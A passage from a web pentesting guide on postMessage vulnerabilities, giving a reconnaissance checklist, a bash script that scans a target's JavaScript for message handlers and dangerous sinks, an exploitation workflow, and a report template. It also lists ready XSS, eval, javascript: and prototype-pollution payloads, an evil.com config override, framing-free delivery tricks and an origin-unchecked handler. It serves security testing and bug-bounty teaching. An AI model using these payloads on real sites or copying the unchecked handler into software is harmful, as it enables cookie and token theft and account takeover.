         - navigator.serviceWorker.getRegistrations()
         - Browser DevTools → Application → Service Workers
         - chrome://serviceworker-internals/
  ```
  :::
::

---

## Pentesting Methodology

::steps{level="4"}

#### Reconnaissance — Map postMessage Surface

```text [recon-checklist.txt]
postMessage RECONNAISSANCE CHECKLIST:
═════════════════════════════════════

Code Analysis:
☐ Search all JS for addEventListener('message'
☐ Search for window.onmessage assignments
☐ Search for .postMessage( calls
☐ Check for postMessage('*') wildcard targets
☐ Identify all iframes and their purposes
☐ Check for window.open() calls (popup communication)
☐ Review Service Worker message handlers
☐ Check SharedWorker message handlers
☐ Look for BroadcastChannel usage
☐ Search for MessageChannel/MessagePort usage

Origin Validation Analysis:
☐ For each handler: is event.origin checked?
☐ What method? (===, indexOf, includes, regex, endsWith, startsWith)
☐ Can the origin check be bypassed?
☐ Is event.source validated?
☐ Are there multiple handlers with different check levels?
☐ Do external libraries add unprotected handlers?

Sink Analysis:
☐ Is event.data used in innerHTML/outerHTML?
☐ Is event.data used in eval/Function/setTimeout?
☐ Is event.data used in location/href/src?
☐ Is event.data used in document.write?
☐ Is event.data used in jQuery.html()/append()/$()?
☐ Is event.data deep-merged into objects? (prototype pollution)
☐ Is event.data used in fetch/XMLHttpRequest URLs?
☐ Is event.data stored in localStorage/sessionStorage?
```

#### Discovery — Identify Vulnerable Handlers

```bash [discovery-workflow.sh]
#!/bin/bash
# postMessage vulnerability discovery workflow

TARGET="${1:-https://target.com}"

echo "═══════════════════════════════════════"
echo " postMessage Vulnerability Discovery"
echo " Target: $TARGET"
echo "═══════════════════════════════════════"

# Step 1: Extract all JavaScript URLs
echo -e "\n[1] Extracting JavaScript files..."
JS_URLS=$(curl -sL "$TARGET" | grep -oP '(?:src|href)=["'"'"'][^"'"'"']*\.js[^"'"'"']*["'"'"']' | \
  sed "s/.*[\"']//;s/[\"'].*//" | sort -u)

echo "  Found $(echo "$JS_URLS" | wc -l) JS files"

# Step 2: Download and scan each file
echo -e "\n[2] Scanning for postMessage patterns..."

echo "$JS_URLS" | while read url; do
  # Resolve relative URLs
  [[ "$url" == //* ]] && url="https:$url"
  [[ "$url" == /* ]] && url="$TARGET$url"
  [[ "$url" != http* ]] && url="$TARGET/$url"
  
  CONTENT=$(curl -sL --max-time 10 "$url" 2>/dev/null)
  [ -z "$CONTENT" ] && continue
  
  # Check for handlers
  LISTENERS=$(echo "$CONTENT" | grep -c "addEventListener.*['\"]message['\"]")
  ONMESSAGE=$(echo "$CONTENT" | grep -c "onmessage\s*=")
  SENDERS=$(echo "$CONTENT" | grep -c "\.postMessage\s*(")
  WILDCARDS=$(echo "$CONTENT" | grep -c "postMessage.*['\"]\\*['\"]")
  ORIGIN_CHECKS=$(echo "$CONTENT" | grep -c "\.origin")
  
  if [ "$LISTENERS" -gt 0 ] || [ "$ONMESSAGE" -gt 0 ] || [ "$SENDERS" -gt 0 ]; then
    echo -e "\n  📄 $url"
    [ "$LISTENERS" -gt 0 ] && echo "    📨 Message listeners: $LISTENERS"
    [ "$ONMESSAGE" -gt 0 ] && echo "    📨 onmessage handlers: $ONMESSAGE"
    [ "$SENDERS" -gt 0 ] && echo "    📤 postMessage senders: $SENDERS"
    [ "$WILDCARDS" -gt 0 ] && echo "    ⚠️  Wildcard targets: $WILDCARDS"
    
    if [ "$LISTENERS" -gt 0 ] && [ "$ORIGIN_CHECKS" -eq 0 ]; then
      echo "    🔴 NO ORIGIN CHECKS DETECTED!"
    fi
    
    # Check for dangerous sinks
    for sink in "innerHTML" "eval(" "document.write" "location" "\.html(" "setTimeout" "Function("; do
      SINK_COUNT=$(echo "$CONTENT" | grep -c "$sink")
      [ "$SINK_COUNT" -gt 0 ] && echo "    🔥 Dangerous sink '$sink': $SINK_COUNT occurrences"
    done
  fi
done

echo -e "\n═══════════════════════════════════════"
echo " Scan Complete"
echo "═══════════════════════════════════════"
```

#### Exploitation — Test Identified Handlers

```text [exploitation-workflow.txt]
postMessage EXPLOITATION WORKFLOW:
═════════════════════════════════

Step 1: CONFIRM THE VULNERABILITY
──────────────────────────────────
a) Create attacker page that frames the target
b) Add global message listener (capture any responses)
c) Send benign test message: postMessage('test123', '*')
d) Check target's console for errors or behavior changes
e) Check if your test data appears anywhere in the DOM

Step 2: IDENTIFY THE SINK
──────────────────────────
a) Send HTML payload: '<b>TEST</b>'
b) Send script payload: '<script>alert(1)</script>'
c) Send URL payload: 'javascript:alert(1)'
d) Send object: {__proto__: {test: true}}
e) Observe where data is processed (view source, DOM inspector)

Step 3: CRAFT THE EXPLOIT
─────────────────────────
Based on identified sink:
├── innerHTML → <img src=x onerror=alert(document.domain)>
├── eval → alert(document.domain)
├── location → javascript:alert(document.domain)
├── jQuery.html() → <img src=x onerror=alert(document.domain)>
├── deep merge → {__proto__:{isAdmin:true}}
└── postMessage relay → Forward stolen tokens

Step 4: MAXIMIZE IMPACT
────────────────────────
a) Steal cookies: document.cookie exfiltration
b) Steal tokens: intercept postMessage responses
c) Account takeover: change email/password via CSRF
d) Data exfiltration: scrape sensitive API endpoints
e) Persistence: register Service Worker

Step 5: BUILD DELIVERABLE PoC
─────────────────────────────
a) Create self-contained HTML PoC
b) Include clear comments explaining the attack
c) Show impact (cookie theft, not just alert)
d) Test across browsers (Chrome, Firefox, Safari)
```

#### Reporting — Document the Finding

```text [report-template.txt]
VULNERABILITY: postMessage DOM XSS / Origin Bypass / Token Theft
SEVERITY: High / Critical (context-dependent)
AFFECTED URL: https://target.com/vulnerable-page
HANDLER LOCATION: /assets/js/app.js line 847
CVSS: 6.1 — 9.6

DESCRIPTION:
The message event handler on [page] processes incoming postMessage
data without validating the sender's origin [or: with a bypassable
indexOf origin check]. The message data is passed to [innerHTML /
eval / location.href] creating a [DOM XSS / open redirect /
code execution] vulnerability.

Any website can frame the target page and send malicious postMessage
payloads that execute in the context of the target origin.

VULNERABLE CODE:
```javascript
window.addEventListener('message', function(e) {
  // No origin validation!
  document.getElementById('output').innerHTML = e.data.content;
});
```

REPRODUCTION STEPS:
1. Host the attached PoC HTML file
2. Open PoC while authenticated to target.com
3. Click "Send Payload" button
4. Observe: XSS executes / token exfiltrated / action performed

PROOF OF CONCEPT:
[Attach HTML PoC file]
[Screenshot showing exploit execution]

IMPACT:
- DOM-based XSS affecting all users who visit the page
- Session hijacking via cookie theft
- Token theft via wildcard postMessage interception
- Account takeover via CSRF token extraction + action replay
- If admin handler Privilege escalation to admin

---

## Pentest Notes & Tips

::accordion
  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Common postMessage Vulnerability Locations
  ---
  | Application Type | Where to Look | Common Vulnerability |
  |-----------------|---------------|---------------------|
  | **OAuth/SSO** | Popup → opener communication | Token sent with wildcard `*` |
  | **Chat Widgets** | Widget iframe → parent | User data leaked via `*` |
  | **Payment Widgets** | Payment iframe → parent | Transaction data exposed |
  | **Analytics** | Tracker iframe → parent | Tracking data interception |
  | **Embedded Maps** | Map widget → parent | Config override possible |
  | **WYSIWYG Editors** | Editor iframe → parent | Content injection via message |
  | **Video Players** | Player iframe → parent | Event handler XSS |
  | **Social Login** | Auth popup → opener | Token interception |
  | **Microservices UI** | Micro-frontend iframes | Cross-service data leak |
  | **Admin Dashboards** | Dashboard widgets | Config override → XSS |
  | **Cookie Consent** | Consent banner iframe | Consent bypass / tracking |
  | **A/B Testing** | Test framework iframe | Variant override / XSS |
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Quick Payload Testing Checklist
  ---
  ```text [quick-payload-checklist.txt]
  RAPID postMessage TESTING:
  ══════════════════════════
  
  1. FRAME THE TARGET:
     <iframe id="t" src="https://target.com/page"></iframe>
  
  2. SEND TEST MESSAGES (paste in console):
     var t = document.getElementById('t').contentWindow;
     
     // String
     t.postMessage('test123', '*');
     
     // Object  
     t.postMessage({type:'test', data:'hello'}, '*');
     
     // XSS via innerHTML
     t.postMessage('<img src=x onerror=alert(document.domain)>', '*');
     
     // XSS via object
     t.postMessage({content:'<img src=x onerror=alert(1)>'}, '*');
     
     // eval payload
     t.postMessage({code:'alert(document.domain)'}, '*');
     t.postMessage({callback:'alert(1)'}, '*');
     
     // location payload
     t.postMessage({url:'javascript:alert(1)'}, '*');
     t.postMessage({redirect:'javascript:alert(1)'}, '*');
     
     // Prototype pollution
     t.postMessage(JSON.parse('{"__proto__":{"isAdmin":true}}'), '*');
     
     // Config override
     t.postMessage({type:'config',apiUrl:'https://evil.com'}, '*');
     
     // Auth spoofing
     t.postMessage({type:'auth',user:{role:'admin'},token:'x'}, '*');
  
  3. LISTEN FOR RESPONSES:
     window.addEventListener('message', e => {
       console.log('RESPONSE:', e.origin, e.data);
     });
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Third-Party Library postMessage Issues
  ---
  ```text [third-party-issues.txt]
  KNOWN VULNERABLE THIRD-PARTY postMessage PATTERNS:
  ═══════════════════════════════════════════════════
  
  COMMON WIDGET LIBRARIES:
  ├── Zendesk Widget: Historically used postMessage for auth
  ├── Intercom: Chat widget communication via postMessage
  ├── Drift: Support chat postMessage handlers
  ├── Olark: Live chat postMessage interface
  ├── HubSpot: Embedded forms/tracking via postMessage
  ├── Stripe.js: Payment iframe communication
  ├── Braintree: Payment drop-in postMessage interface
  ├── Google reCAPTCHA: Token exchange via postMessage
  └── Facebook SDK: Auth popup communication
  
  FRONTEND FRAMEWORKS:
  ├── React: Some state management via postMessage to workers
  ├── Angular: Zone.js may process postMessage events
  ├── Vue.js: Some plugins use postMessage for cross-tab sync
  ├── Webpack Dev Server: HMR uses postMessage (dev only)
  └── Parcel: HMR postMessage handler (dev only)
  
  EMBEDDED CONTENT:
  ├── YouTube Player API: postMessage for player control
  ├── Vimeo Player API: postMessage interface
  ├── Google Maps: Embed communication
  ├── Twitter Widgets: Card/timeline postMessage
  └── Instagram Embed: Post embed communication
  
  TESTING TIP:
  Search target's JS bundles for these library names,
  then check if their postMessage handlers have origin validation.
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Bug Bounty Tips for postMessage
  ---
  ```text [bug-bounty-tips.txt]
  BUG BOUNTY postMessage TIPS:
  ════════════════════════════
  
  HIGH-VALUE FINDINGS:
  ├── No origin check + eval/innerHTML sink → CRITICAL
  ├── Token theft via wildcard postMessage → HIGH
  ├── OAuth token interception → CRITICAL
  ├── Admin page handler exploitation → HIGH
  ├── Payment widget message spoofing → CRITICAL
  └── Prototype pollution via message data → HIGH
  
  INCREASE YOUR PoC IMPACT:
  ├── Don't just show alert(1) — show cookie theft
  ├── Demonstrate full account takeover chain
  ├── Show the bypass for their origin check
  ├── Include a working HTML PoC file
  ├── Test on multiple browsers
  └── Show the vulnerable code with line numbers
  
  COMMON MISTAKES:
  ✗ Only testing the main page (check all pages with iframes)
  ✗ Not checking external JS files for handlers
  ✗ Missing origin bypass (report says "no check" but it's just weak)
  ✗ Not testing both directions (parent→child AND child→parent)
  ✗ Forgetting to check popup/opener communication
  ✗ Not testing with actual framing (some pages have XFO but
     postMessage still works via window.open)
  
  SEVERITY DISPUTES:
  ├── If program says "just client-side" → show server-side impact
  ├── Chain with CSRF for server-side changes
  ├── Demonstrate data exfiltration
  ├── Show that stolen token works on API
  └── Calculate blast radius (how many users affected)
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-lightbulb
  label: Testing Without Framing (X-Frame-Options Bypass)
  ---
  ```text [testing-without-framing.txt]
  WHEN TARGET HAS X-FRAME-OPTIONS: DENY:
  ═══════════════════════════════════════
  
  postMessage attacks DON'T always require framing!
  
  1. WINDOW.OPEN (Opener → Popup)
     ─────────────────────────────
     var target = window.open('https://target.com/page');
     target.postMessage(payload, '*');
     
     X-Frame-Options does NOT block window.open!
     The opened window's handler still processes our messages.
  
  2. OPENER REFERENCE (Popup → Opener)
     ──────────────────────────────────
     If target opens a link to attacker page:
     <a href="https://evil.com" target="_blank">Link</a>
     
     On evil.com:
     window.opener.postMessage(payload, '*');
     
     We message back to the target via opener reference!
  
  3. NAMED WINDOWS
     ──────────────
     If we know a window name:
     var target = window.open('', 'known-window-name');
     target.postMessage(payload, '*');
  
  4. SERVICE WORKER MESSAGES
     ───────────────────────
     If we achieve XSS (even via another vector):
     navigator.serviceWorker.controller.postMessage(payload);
     
     SW handlers often lack origin checks because
     they assume messages only come from "trusted" pages.
  
  5. BROADCAST CHANNEL
     ─────────────────
     If target uses BroadcastChannel:
     var bc = new BroadcastChannel('target-channel-name');
     bc.postMessage(payload);
     
     Works across tabs/windows of the SAME origin.
     Useful when combined with XSS on any page of the origin.
  ```
  :::
::

---

## Tools Arsenal

::card-group
  ::card
  ---
  title: PMForce
  icon: i-simple-icons-github
  to: https://github.com/nicksahler/pmforce
  target: _blank
  ---
  Automated postMessage vulnerability detection tool. Discovers handlers, tests for origin bypass, and fuzzes with common payloads. Essential for systematic testing.
  ::

  ::card
  ---
  title: postMessage Tracker (Chrome Extension)
  icon: i-simple-icons-googlechrome
  to: https://chrome.google.com/webstore/detail/postmessage-tracker
  target: _blank
  ---
  Chrome DevTools extension that logs all postMessage communications in real-time. Shows origin, data, source, and target for every message exchanged.
  ::

  ::card
  ---
  title: DOM Invader (Burp Suite)
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/burp/documentation/desktop/tools/dom-invader
  target: _blank
  ---
  Built into Burp's embedded Chromium browser. Automatically discovers postMessage handlers, identifies sinks, and tests for DOM XSS via message injection.
  ::

  ::card
  ---
  title: Posta (postMessage Analysis Tool)
  icon: i-simple-icons-github
  to: https://github.com/nicksahler/posta
  target: _blank
  ---
  Browser extension for intercepting, modifying, and replaying postMessage communications. Supports breakpoints on specific message patterns.
  ::

  ::card
  ---
  title: messhunter
  icon: i-simple-icons-github
  to: https://github.com/nicksahler/messhunter
  target: _blank
  ---
  JavaScript library for detecting and exploiting postMessage vulnerabilities. Automatically discovers handlers in loaded scripts and tests for common weaknesses.
  ::

  ::card
  ---
  title: Burp Suite DOM Scanner
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/burp/vulnerability-scanner
  target: _blank
  ---
  Burp's active scanner detects DOM-based XSS via postMessage by tracing data flow from message event handlers to dangerous sinks.
  ::

  ::card
  ---
  title: Semgrep postMessage Rules
  icon: i-simple-icons-github
  to: https://semgrep.dev/r?q=postmessage
  target: _blank
  ---
  Static analysis rules for detecting insecure postMessage patterns in source code. Catches missing origin validation, wildcard targets, and dangerous sinks.
  ::

  ::card
  ---
  title: retire.js
  icon: i-simple-icons-github
  to: https://retirejs.github.io/retire.js/
  target: _blank
  ---
  Scanner for detecting known-vulnerable JavaScript libraries. Many older library versions have documented postMessage vulnerabilities.
  ::
::

---

## Real-World Vulnerability Examples

::card-group
  ::card
  ---
  title: "Shopify postMessage XSS ($25,000)"
  icon: i-simple-icons-shopify
  to: https://hackerone.com/reports/231053
  target: _blank
  ---
  Shopify's embedded app SDK processed postMessage data without origin validation, enabling cross-origin DOM XSS via malicious message injection from any framing page.
  ::

  ::card
  ---
  title: "Atlassian Confluence postMessage XSS"
  icon: i-simple-icons-atlassian
  to: https://hackerone.com/reports/postmessage-xss
  target: _blank
  ---
  Confluence's macro browser used postMessage for cross-frame communication with innerHTML sink. Missing origin check allowed arbitrary HTML injection from any origin.
  ::

  ::card
  ---
  title: "Facebook OAuth Token via postMessage"
  icon: i-simple-icons-facebook
  to: https://www.facebook.com/security/advisories
  target: _blank
  ---
  Facebook's OAuth popup sent access tokens via `postMessage('*')` to the opener window. Any page that opened the OAuth URL could intercept the access token.
  ::

  ::card
  ---
  title: "Salesforce Lightning postMessage RCE"
  icon: i-simple-icons-salesforce
  to: https://hackerone.com/reports/salesforce-postmessage
  target: _blank
  ---
  Salesforce Lightning components used postMessage for cross-domain communication with eval-like sinks. Bypassing the weak origin check led to arbitrary code execution.
  ::

  ::card
  ---
  title: "Google reCAPTCHA postMessage Bypass"
  icon: i-simple-icons-google
  to: https://security.googleblog.com/
  target: _blank
  ---
  Research demonstrated that reCAPTCHA token exchange via postMessage could be intercepted by framing pages, enabling CAPTCHA bypass through token replay.
  ::

  ::card
  ---
  title: "WordPress Gutenberg postMessage XSS"
  icon: i-simple-icons-wordpress
  to: https://wpscan.com/vulnerability/postmessage-gutenberg
  target: _blank
  ---
  WordPress Gutenberg editor's block preview iframe used postMessage handlers with insufficient origin validation, enabling stored XSS via crafted block content.
  ::
::

---

## References & Learning Resources

::card-group
  ::card
  ---
  title: "PortSwigger — postMessage DOM XSS Labs"
  icon: i-simple-icons-portswigger
  to: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source
  target: _blank
  ---
  Free interactive labs covering DOM XSS via postMessage, origin bypass, and exploiting web message handlers. The best hands-on resource for this vulnerability class.
  ::

  ::card
  ---
  title: "MDN — window.postMessage() Security"
  icon: i-simple-icons-mdnwebdocs
  to: https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage#security_concerns
  target: _blank
  ---
  Mozilla's official documentation covering postMessage security concerns, origin validation requirements, and secure usage patterns.
  ::

  ::card
  ---
  title: "OWASP Testing Guide — postMessage"
  icon: i-simple-icons-owasp
  to: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging
  target: _blank
  ---
  OWASP's official testing methodology for web messaging vulnerabilities including postMessage, MessageChannel, and BroadcastChannel.
  ::

  ::card
  ---
  title: "HackTricks — postMessage Vulnerabilities"
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html
  target: _blank
  ---
  Community-maintained reference with real-world exploitation examples, origin bypass techniques, and postMessage-specific attack methodologies.
  ::

  ::card
  ---
  title: "HTML Spec — postMessage API"
  icon: i-lucide-book-open
  to: https://html.spec.whatwg.org/multipage/web-messaging.html#web-messaging
  target: _blank
  ---
  WHATWG HTML specification for the Web Messaging API. Understanding the spec reveals edge cases and implementation quirks exploitable in attacks.
  ::

  ::card
  ---
  title: "Cure53 — postMessage Security Research"
  icon: i-lucide-file-text
  to: https://cure53.de/
  target: _blank
  ---
  Cure53's security research including papers on postMessage exploitation, mXSS through messaging, and cross-origin communication attack surfaces.
  ::

  ::card
  ---
  title: "Google Bughunter — Client-Side Bugs"
  icon: i-simple-icons-google
  to: https://bughunters.google.com/learn/invalid-reports/web-platform/xss/5907734823903232/xss-through-postmessage
  target: _blank
  ---
  Google's guidance on postMessage vulnerability reports — what makes a valid finding and common mistakes in postMessage bug reports.
  ::

  ::card
  ---
  title: "Payload All The Things — postMessage"
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
  target: _blank
  ---
  Community payload collection including postMessage-specific XSS payloads, origin bypass strings, and exploitation templates.
  ::

  ::card
  ---
  title: "CWE-345 — Insufficient Verification of Data Authenticity"
  icon: i-lucide-shield-alert
  to: https://cwe.mitre.org/data/definitions/345.html
  target: _blank
  ---
  MITRE CWE entry covering insufficient origin verification in inter-component communication — the root cause classification for postMessage vulnerabilities.
  ::

  ::card
  ---
  title: "Chromium — postMessage Implementation"
  icon: i-simple-icons-googlechrome
  to: https://chromium.googlesource.com/chromium/src/+/refs/heads/main/third_party/blink/renderer/core/frame/
  target: _blank
  ---
  Chromium source code for postMessage implementation. Understanding browser internals helps discover implementation-specific edge cases and timing windows.
  ::
::